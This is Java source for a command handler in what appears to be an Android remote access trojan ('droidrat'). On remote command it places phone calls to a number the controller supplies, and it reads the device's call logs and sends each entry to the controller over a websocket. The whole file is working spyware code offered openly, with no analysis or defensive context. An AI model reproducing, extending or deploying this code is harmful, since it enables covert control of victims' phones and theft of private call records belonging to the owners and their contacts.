package com.je_chen.droidrat_je.command;

import android.content.Context;
import android.util.Log;


import com.je_chen.droidrat_je.rat.command.process_super.CommandFather;
import com.je_chen.droidrat_je.rat.command.process_super.CommandProcessInterface;
import com.je_chen.droidrat_je.rat.modules.appintent.call.Call;

import static com.je_chen.droidrat_je.service.command.ProcessCommandService.websocket;

public class CallCommand extends CommandFather implements CommandProcessInterface {

    private final String TAG = "Call Event ";

    private Call call;

    private Context context;

    public CallCommand(Context context) {
        this.context = context;
        call = new Call(context);
    }

    @Override
    public void send(String value) {
        websocket.send(value);
    }

    @Override
    public void processCommand(String command) {
        try {
            String[] rawCommandArray = command.split(" ");
            switch (rawCommandArray[1]) {
                case "Call":
                    String phoneNumber = rawCommandArray[2];
                    Log.d(TAG, "CallPhone:" + phoneNumber);
                    call.call(phoneNumber);
                    this.send("CallPhone:" + phoneNumber);
                    break;

                case "CallLogs":
                    Log.d(TAG, "CallLogs:");
                    for (String callLogs : call.getCallLogs())
                        this.send("CallLogs:" + callLogs);
                    break;
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
